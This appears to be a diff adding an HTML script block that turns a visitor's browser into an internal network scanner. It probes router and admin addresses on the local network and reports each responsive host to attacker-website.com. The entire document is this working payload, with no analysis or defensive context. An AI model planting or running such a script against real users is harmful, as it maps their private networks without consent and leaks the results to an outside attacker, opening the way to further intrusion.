@@ -1,0 +1,9 @@
+<script>
+// Probe the internal network (Browser-powered Scanning)
+var internalIPs = ['192.168.1.1', '192.168.1.254', 'router.local'];
+internalIPs.forEach(function(ip) {
+    fetch('http://' + ip + '/admin', {mode: 'no-cors'})
+      .then(() => fetch('https://attacker-website.com/log?live=' + ip))
+      .catch(() => {});
+});
+</script>
